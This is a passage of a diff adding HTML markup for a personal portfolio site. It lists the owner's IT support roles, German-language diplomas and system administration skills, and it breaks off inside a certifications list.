+                <a href="#about" class="nav-link hover-trigger">Identity</a>
+                <a href="#experience" class="nav-link hover-trigger">Experience</a>
+                <a href="#education" class="nav-link hover-trigger">Education</a>
+                <a href="#expertise" class="nav-link hover-trigger">Skills</a>
+                <a href="#contact" class="nav-link hover-trigger">Contact</a>
+            </div>
+            <button id="mobile-menu-btn" class="md:hidden flex flex-col justify-center items-center w-8 h-8 space-y-1.5 focus:outline-none z-50 relative hover-trigger" aria-label="Toggle Menu">
+                <span class="block w-6 h-[2px] bg-white transition-transform duration-400 origin-center" id="bar1"></span>
+                <span class="block w-6 h-[2px] bg-white transition-opacity duration-400" id="bar2"></span>
+                <span class="block w-6 h-[2px] bg-white transition-transform duration-400 origin-center" id="bar3"></span>
+            </button>
+        </div>
+    </nav>
+
+    <div id="mobile-menu" class="fixed inset-0 bg-black/95 backdrop-blur-3xl z-40 flex flex-col justify-center items-center gap-10 opacity-0 pointer-events-none transition-all duration-700 ease-[cubic-bezier(0.19,1,0.22,1)]">
+        <a href="#about" class="font-display text-5xl font-bold text-white mobile-link hover-trigger">Identity</a>
+        <a href="#experience" class="font-display text-5xl font-bold text-white mobile-link hover-trigger">Experience</a>
+        <a href="#education" class="font-display text-5xl font-bold text-white mobile-link hover-trigger">Education</a>
+        <a href="#expertise" class="font-display text-5xl font-bold text-white mobile-link hover-trigger">Skills</a>
+        <a href="#contact" class="font-display text-5xl font-bold text-white mobile-link hover-trigger">Contact</a>
+    </div>
+
+    <!-- ==========================================================================
+         MAIN CONTENT WRAPPER
+         ========================================================================== -->
+    <main class="w-full relative z-10">
+
+        <!-- ==========================================================================
+             HERO SECTION (WITH GEMINI-LEVEL CONTINUOUS FIXER-BOT EFFECT)
+             ========================================================================== -->
+        <section id="about" class="min-h-screen flex flex-col justify-center px-6 pt-32 pb-20 max-w-[1400px] mx-auto">
+            <div class="w-full max-w-5xl relative z-10">
+                
+                <div class="reveal">
+                    <div class="section-tag hover-trigger">App/Cloud Technical Support Expert</div>
+                </div>
+
+                <!-- Fixer Scene Container -->
+                <div class="reveal reveal-delay-1 mb-10 w-full relative">
+                    <div class="comet-card p-6 md:p-12 border-white/10 hover-trigger relative overflow-hidden" id="fixer-scene-container" style="min-height: 380px;">
+                        
+                        <!-- The Fixer Bot (SVG) -->
+                        <div id="fixer-bot" class="bot-glow">
+                            <svg width="40" height="40" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                                <circle cx="50" cy="50" r="18" fill="#18181b" stroke="#00e1ff" stroke-width="3"/>
+                                <rect x="35" y="45" width="30" height="10" rx="5" fill="#000"/>
+                                <circle cx="45" cy="50" r="3" fill="#bc13fe" class="animate-pulse"/>
+                                <circle cx="55" cy="50" r="3" fill="#bc13fe" class="animate-pulse"/>
+                                <path d="M 50,32 L 50,15 M 50,15 L 60,10" stroke="#a1a1aa" stroke-width="3" stroke-linecap="round"/>
+                                <circle cx="60" cy="10" r="4" fill="#00e1ff"/>
+                                <path d="M 40,68 L 50,85 L 60,68 Z" fill="#3f3f46"/>
+                                <circle cx="50" cy="88" r="8" fill="#00e1ff" filter="blur(4px)" class="animate-pulse"/>
+                            </svg>
+                            <div class="tractor-beam" id="tractor-beam"></div>
+                        </div>
+
+                        <!-- Spark particle container for welding/fixing -->
+                        <div id="weld-sparks" class="absolute inset-0 pointer-events-none z-[70] overflow-visible"></div>
+
+                        <!-- The Text Target for Physics Engine -->
+                        <h1 id="physics-text-block" class="font-display hero-title text-5xl sm:text-7xl md:text-[6rem] lg:text-[7rem] font-black leading-[1.1] tracking-tighter flex flex-col gap-2 sm:gap-4 w-full">
+                            <!-- JS will dynamically inject the splitted text here -->
+                        </h1>
+
+                    </div>
+                </div>
+
+                <div class="flex flex-col md:flex-row gap-4 md:gap-6 items-start md:items-center mb-16 reveal reveal-delay-2">
+                    <p class="font-mono-custom text-xs md:text-sm text-gray-300 uppercase tracking-widest font-bold bg-[var(--bg-surface)] backdrop-blur-[40px] border border-white/10 shadow-[var(--shadow-lg)] px-6 py-3.5 rounded-full hover-trigger transition-transform hover:-translate-y-1">
+                        German C1
+                    </p>
+                    <p class="font-mono-custom text-xs md:text-sm text-gray-300 uppercase tracking-widest font-bold bg-[var(--bg-surface)] backdrop-blur-[40px] border border-white/10 shadow-[var(--shadow-lg)] px-6 py-3.5 rounded-full hover-trigger transition-transform hover:-translate-y-1">
+                        Cloud Technical Support
+                    </p>
+                    <p class="font-mono-custom text-xs md:text-sm text-gray-300 uppercase tracking-widest font-bold bg-[var(--bg-surface)] backdrop-blur-[40px] border border-white/10 shadow-[var(--shadow-lg)] px-6 py-3.5 rounded-full hover-trigger transition-transform hover:-translate-y-1">
+                        Systems Admin
+                    </p>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-12 gap-12 items-center reveal reveal-delay-3">
+                    <div class="md:col-span-7 comet-cards-wrapper">
+                        <div class="comet-card p-6 md:p-8 lg:p-10 border-white/10 hover-trigger">
+                            <p class="text-xl md:text-2xl text-gray-400 leading-relaxed font-light">
+                                Dynamic and results-oriented professional with a proven track record as an App/cloud technical support-german language expert. Passionate about delivering outstanding service and contributing to an inclusive work environment.
+                            </p>
+                        </div>
+                    </div>
+                    <div class="md:col-span-5 flex justify-start md:justify-end">
+                        <div class="magnetic-btn-wrapper hover-trigger" id="magnetic-btn">
+                            <a href="#experience" class="btn-premium">
+                                Explore Experience 
+                                <svg class="w-6 h-6 ml-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3"></path></svg>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bento Grid Stats -->
+                <div class="comet-cards-wrapper grid grid-cols-2 md:grid-cols-4 gap-6 mt-28 reveal reveal-delay-4">
+                    <div class="comet-card card-tilt !p-8 flex flex-col justify-center items-center text-center hover-trigger border-white/10">
+                        <h2 class="font-display text-5xl md:text-6xl font-black text-primary tracking-tighter mb-3">4.0</h2>
+                        <p class="font-mono-custom text-[10px] md:text-xs text-gray-400 uppercase tracking-widest font-bold">Years Exp.</p>
+                    </div>
+                    <div class="comet-card card-tilt !p-8 flex flex-col justify-center items-center text-center hover-trigger border-white/10">
+                        <h2 class="font-display text-5xl md:text-6xl font-black text-primary tracking-tighter mb-3">3+</h2>
+                        <p class="font-mono-custom text-[10px] md:text-xs text-gray-400 uppercase tracking-widest font-bold">Enterprises</p>
+                    </div>
+                    <div class="comet-card card-tilt !p-8 flex flex-col justify-center items-center text-center hover-trigger border-white/10">
+                        <h2 class="font-display text-5xl md:text-6xl font-black text-primary tracking-tighter mb-3">C1</h2>
+                        <p class="font-mono-custom text-[10px] md:text-xs text-gray-400 uppercase tracking-widest font-bold">German Level</p>
+                    </div>
+                    <div class="comet-card card-tilt !p-8 flex flex-col justify-center items-center text-center hover-trigger border-white/10">
+                        <h2 class="font-display text-5xl md:text-6xl font-black text-primary tracking-tighter mb-3">5</h2>
+                        <p class="font-mono-custom text-[10px] md:text-xs text-gray-400 uppercase tracking-widest font-bold">Certifications</p>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- ==========================================================================
+             EXPERIENCE SECTION (CV EXACT)
+             ========================================================================== -->
+        <section id="experience" class="py-32 px-6 max-w-[1400px] mx-auto border-t border-white/10">
+            
+            <div class="flex flex-col md:flex-row justify-between items-start md:items-end mb-24 reveal">
+                <div>
+                    <div class="section-tag hover-trigger">Career Trajectory</div>
+                    <h2 class="font-display text-5xl md:text-[4.5rem] font-black tracking-tighter text-primary leading-tight mt-4">
+                        Professional <br> History.
+                    </h2>
+                </div>
+            </div>
+
+            <div class="timeline-container max-w-5xl mx-auto">
+                
+                <!-- Role 1: Accenture -->
+                <div class="timeline-node reveal">
+                    <div class="timeline-dot"></div>
+                    <div class="comet-cards-wrapper">
+                        <div class="comet-card hover-trigger p-8 md:p-12 border-white/10">
+                            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-8 gap-4 border-b border-white/10 pb-6">
+                                <div>
+                                    <h3 class="font-display text-2xl md:text-3xl font-bold text-primary tracking-tight">App/cloud Technical Support Analyst</h3>
+                                    <p class="font-mono-custom text-sm text-accent-cyan mt-2 tracking-widest uppercase font-bold">Accenture &middot; Gurugram, Haryana</p>
+                                </div>
+                                <span class="inline-block px-5 py-2.5 bg-white/10 border border-white/20 rounded-full font-mono-custom text-[10px] sm:text-xs font-bold text-primary uppercase tracking-widest whitespace-nowrap shadow-sm">
+                                    11/2024 — Present
+                                </span>
+                            </div>
+                            <ul class="space-y-5 text-gray-400 leading-relaxed font-light text-base md:text-lg">
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-accent-cyan mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span class="font-semibold text-white">Delivered end-to-end technical solutions to end-users from Germany, Austria, and Switzerland.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Added and configured new devices within the corporate network.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Managed DHCP servers for network related issues.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Troubleshot printer issues, including connectivity, installation, and driver errors.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Managed user accounts, permissions, and security groups using Azure Active Directory.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Worked on all kind of Windows related Issues.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Delivered end-to-end technical support to end users, ensuring minimal disruption to daily operations.</span>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Role 2: ITC Infotech -->
+                <div class="timeline-node reveal">
+                    <div class="timeline-dot"></div>
+                    <div class="comet-cards-wrapper">
+                        <div class="comet-card hover-trigger p-8 md:p-12 border-white/10">
+                            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-8 gap-4 border-b border-white/10 pb-6">
+                                <div>
+                                    <h3 class="font-display text-2xl md:text-3xl font-bold text-primary tracking-tight">Senior Systems Administrator</h3>
+                                    <p class="font-mono-custom text-sm text-accent-cyan mt-2 tracking-wide uppercase font-bold">ITC Infotech &middot; Bengaluru, Karnataka</p>
+                                </div>
+                                <span class="inline-block px-5 py-2.5 bg-white/10 border border-white/20 rounded-full font-mono-custom text-[10px] sm:text-xs font-bold text-primary uppercase tracking-widest whitespace-nowrap shadow-sm">
+                                    04/2024 — 11/2024
+                                </span>
+                            </div>
+                            <ul class="space-y-5 text-gray-400 leading-relaxed font-light text-base md:text-lg">
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Administer Windows, Office, Active Directory, and network infrastructure. Manage DHCP and resolve network issues.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Working as L1-L1.5 support and communicating with German-speaking users to resolve inquiries and issues.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Added and configured new devices in the company network. Assigned static and dynamic IP addresses to devices.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Troubleshot printer issues (installation, connectivity, driver problems).</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Managed user access and permissions through Azure AD.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Resolved all types of Windows issues.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Using tools like Azure, Microsoft Admin center, ARS, AD, Intune, Bomgar, Servicenow, Confluence.</span>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Role 3: Wipro -->
+                <div class="timeline-node reveal">
+                    <div class="timeline-dot"></div>
+                    <div class="comet-cards-wrapper">
+                        <div class="comet-card hover-trigger p-8 md:p-12 border-white/10">
+                            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-8 gap-4 border-b border-white/10 pb-6">
+                                <div>
+                                    <h3 class="font-display text-2xl md:text-3xl font-bold text-primary tracking-tight">Senior associate/German language technical support</h3>
+                                    <p class="font-mono-custom text-sm text-accent-cyan mt-2 tracking-wide uppercase font-bold">Wipro Limited &middot; Hyderabad</p>
+                                </div>
+                                <span class="inline-block px-5 py-2.5 bg-white/10 border border-white/20 rounded-full font-mono-custom text-[10px] sm:text-xs font-bold text-primary uppercase tracking-widest whitespace-nowrap shadow-sm">
+                                    12/2021 — 09/2023
+                                </span>
+                            </div>
+                            <ul class="space-y-5 text-gray-400 leading-relaxed font-light text-base md:text-lg">
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Worked for Wipro Technologies as Google T1 accessibility technical support (German).</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Proactively identified solution to common user issues.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Provided technical support to user's on Accessibility technologies.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Job profile involes speaking, chatting and writing. Resolving users issues via call chat or email.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Dealing with Google platforms that have Android support in it.</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <svg class="w-6 h-6 mr-4 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    <span>Adhered to quality and service standards to support operational goals.</span>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- ==========================================================================
+             EDUCATION TIMELINE SECTION (CV EXACT)
+             ========================================================================== -->
+        <section id="education" class="py-32 px-6 max-w-[1400px] mx-auto border-t border-white/10 relative">
+            <div class="reveal mb-24 text-center">
+                <div class="section-tag mx-auto hover-trigger">Academic Foundation</div>
+                <h2 class="font-display text-5xl md:text-[4.5rem] font-black tracking-tighter text-primary leading-tight mt-4">
+                    Education.
+                </h2>
+            </div>
+
+            <!-- Custom Vertical Split Timeline -->
+            <div class="edu-timeline-container relative max-w-5xl mx-auto before:absolute before:top-0 before:bottom-0 before:w-[2px] before:bg-gradient-to-b before:from-transparent before:via-white/20 before:to-transparent">
+                
+                <!-- Advanced Diploma -->
+                <div class="edu-timeline-node reveal">
+                    <div class="edu-timeline-dot"></div>
+                    <div class="edu-timeline-content comet-cards-wrapper">
+                        <div class="comet-card hover-trigger p-8 md:p-12 border-white/10">
+                            <span class="inline-block px-4 py-2 bg-purple-500/10 text-purple-400 font-mono-custom text-[10px] font-bold uppercase tracking-widest rounded-md mb-5 border border-purple-500/20 shadow-[0_0_15px_rgba(188,19,254,0.3)]">07/2023</span>
+                            <h3 class="font-display text-2xl font-bold text-primary mb-2 leading-tight">Advanced Diploma: German Language (C1)</h3>
+                            <p class="text-gray-400 font-light mt-1">Osmania University</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Senior Diploma -->
+                <div class="edu-timeline-node reveal">
+                    <div class="edu-timeline-dot"></div>
+                    <div class="edu-timeline-content comet-cards-wrapper">
+                        <div class="comet-card hover-trigger p-8 md:p-12 border-white/10">
+                            <span class="inline-block px-4 py-2 bg-purple-500/10 text-purple-400 font-mono-custom text-[10px] font-bold uppercase tracking-widest rounded-md mb-5 border border-purple-500/20 shadow-[0_0_15px_rgba(188,19,254,0.3)]">11/2021</span>
+                            <h3 class="font-display text-2xl font-bold text-primary mb-2 leading-tight">Senior Diploma: German Language (B2)</h3>
+                            <p class="text-gray-400 font-light mt-1">Osmania University</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Junior Diploma -->
+                <div class="edu-timeline-node reveal">
+                    <div class="edu-timeline-dot"></div>
+                    <div class="edu-timeline-content comet-cards-wrapper">
+                        <div class="comet-card hover-trigger p-8 md:p-12 border-white/10">
+                            <span class="inline-block px-4 py-2 bg-purple-500/10 text-purple-400 font-mono-custom text-[10px] font-bold uppercase tracking-widest rounded-md mb-5 border border-purple-500/20 shadow-[0_0_15px_rgba(188,19,254,0.3)]">04/2021</span>
+                            <h3 class="font-display text-2xl font-bold text-primary mb-2 leading-tight">Junior Diploma: German Language (A2)</h3>
+                            <p class="text-gray-400 font-light mt-1">Osmania University</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bachelor of Arts -->
+                <div class="edu-timeline-node reveal">
+                    <div class="edu-timeline-dot"></div>
+                    <div class="edu-timeline-content comet-cards-wrapper">
+                        <div class="comet-card hover-trigger p-8 md:p-12 border-white/10">
+                            <span class="inline-block px-4 py-2 bg-cyan-500/10 text-cyan-400 font-mono-custom text-[10px] font-bold uppercase tracking-widest rounded-md mb-5 border border-cyan-500/20 shadow-[0_0_15px_rgba(0,242,255,0.3)]">05/2020</span>
+                            <h3 class="font-display text-2xl font-bold text-primary mb-2 leading-tight">Bachelor of Arts (Hons): English</h3>
+                            <p class="text-gray-400 font-light mt-1">University of Delhi</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Intermediate -->
+                <div class="edu-timeline-node reveal">
+                    <div class="edu-timeline-dot"></div>
+                    <div class="edu-timeline-content comet-cards-wrapper">
+                        <div class="comet-card hover-trigger p-8 md:p-12 border-white/10">
+                            <span class="inline-block px-4 py-2 bg-emerald-500/10 text-emerald-400 font-mono-custom text-[10px] font-bold uppercase tracking-widest rounded-md mb-5 border border-emerald-500/20 shadow-[0_0_15px_rgba(16,185,129,0.3)]">05/2016</span>
+                            <h3 class="font-display text-2xl font-bold text-primary mb-2 leading-tight">Intermediate</h3>
+                            <p class="text-gray-400 font-light mt-1 leading-snug">Board of High School & Intermediate Education</p>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- ==========================================================================
+             SATURN SEPARATOR (SUPERB VISIBILITY)
+             ========================================================================== -->
+        <div class="w-full flex justify-center items-center pt-0 pb-10 md:pb-20 -mt-16 md:-mt-28 relative z-0 pointer-events-none reveal">
+            <div class="scale-[0.55] sm:scale-[0.7] md:scale-90 lg:scale-100 origin-center transition-transform duration-700">
+                <div class="relative w-[600px] h-[600px]" style="animation: float-saturn 10s ease-in-out infinite;">
+                    <div class="beautiful-saturn-wrapper" id="main-saturn" style="top: 50%; left: 50%;">
+                        <div class="bs-ring bs-ring-back"></div>
+                        <div class="bs-shadow-caster"></div>
+                        <div class="bs-core">
+                            <div class="planet-noise"></div>
+                            <div class="bs-core-shadow"></div>
+                        </div>
+                        <div class="bs-ring bs-ring-front"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==========================================================================
+             EXPERTISE & SKILLS SECTION
+             ========================================================================== -->
+        <section id="expertise" class="py-32 px-6 max-w-[1400px] mx-auto border-t border-white/10">
+            
+            <div class="reveal mb-24">
+                <div class="section-tag hover-trigger">Core Competencies</div>
+                <h2 class="font-display text-5xl md:text-[4.5rem] font-black tracking-tighter text-primary leading-tight mt-4">
+                    Expertise & <br> Credentials.
+                </h2>
+            </div>
+
+            <!-- Bento Grid layout for skills -->
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 mb-24">
+                
+                <!-- System Administration Card -->
+                <div class="comet-cards-wrapper reveal reveal-delay-1 lg:col-span-2">
+                    <div class="comet-card hover-trigger p-8 md:p-12 border-white/10">
+                        <h3 class="font-display text-3xl font-bold text-primary tracking-tight mb-8 border-b border-white/10 pb-6">System Administration</h3>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                            <div class="flex items-center p-5 border border-white/10 rounded-2xl bg-transparent shadow-sm hover:bg-white/5 transition-colors">
+                                <div class="w-12 h-12 rounded-xl bg-blue-500/20 text-blue-400 flex items-center justify-center mr-5">
+                                    <span class="font-black font-display text-lg">MS</span>
+                                </div>
+                                <span class="font-semibold text-primary text-lg">Microsoft Entra & AD</span>
+                            </div>
+                            <div class="flex items-center p-5 border border-white/10 rounded-2xl bg-transparent shadow-sm hover:bg-white/5 transition-colors">
+                                <div class="w-12 h-12 rounded-xl bg-indigo-500/20 text-indigo-400 flex items-center justify-center mr-5">
+                                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                                </div>
+                                <span class="font-semibold text-primary text-lg">Intune & Office</span>
+                            </div>
+                            <div class="flex items-center p-5 border border-white/10 rounded-2xl bg-transparent shadow-sm hover:bg-white/5 transition-colors">
+                                <div class="w-12 h-12 rounded-xl bg-emerald-500/20 text-emerald-400 flex items-center justify-center mr-5">
+                                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"></path></svg>
+                                </div>
+                                <span class="font-semibold text-primary text-lg">Windows Ecosystems</span>
+                            </div>
+                            <div class="flex items-center p-5 border border-white/10 rounded-2xl bg-transparent shadow-sm hover:bg-white/5 transition-colors">
+                                <div class="w-12 h-12 rounded-xl bg-orange-500/20 text-orange-400 flex items-center justify-center mr-5">
+                                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path></svg>
+                                </div>
+                                <span class="font-semibold text-primary text-lg">Active Roles Server (ARS)</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- IT & Networking Card -->
+                <div class="comet-cards-wrapper reveal reveal-delay-2">
+                    <div class="comet-card hover-trigger p-8 md:p-12 border-white/10">
+                        <h3 class="font-display text-3xl font-bold text-primary tracking-tight mb-8 border-b border-white/10 pb-6">Technical Skills</h3>
+                        <ul class="space-y-5 text-gray-300 font-medium text-lg">
+                            <li class="flex items-center justify-between border-b border-white/5 pb-3">
+                                <span>IT Fundamentals</span>
+                                <svg class="w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                            </li>
+                            <li class="flex items-center justify-between border-b border-white/5 pb-3">
+                                <span>Networking Basics</span>
+                                <svg class="w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                            </li>
+                            <li class="flex items-center justify-between border-b border-white/5 pb-3">
+                                <span>Linux Administration</span>
+                                <svg class="w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                            </li>
+                            <li class="flex items-center justify-between">
+                                <span>WCAG, NVDA, BeMyEyes</span>
+                                <svg class="w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Certifications List (EXACTLY FROM CV) -->
+                <div class="comet-cards-wrapper reveal reveal-delay-3 lg:col-span-3">
+                    <div class="comet-card hover-trigger p-8 md:p-12 border-white/10">
+                        <h3 class="font-display text-3xl font-bold text-primary tracking-tight mb-8 border-b border-white/10 pb-6">Certifications</h3>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            
+                            <div class="flex items-center justify-between p-6 rounded-2xl border border-white/10 bg-transparent hover:bg-white/5 transition-colors">
+                                <div class="flex items-center gap-5">
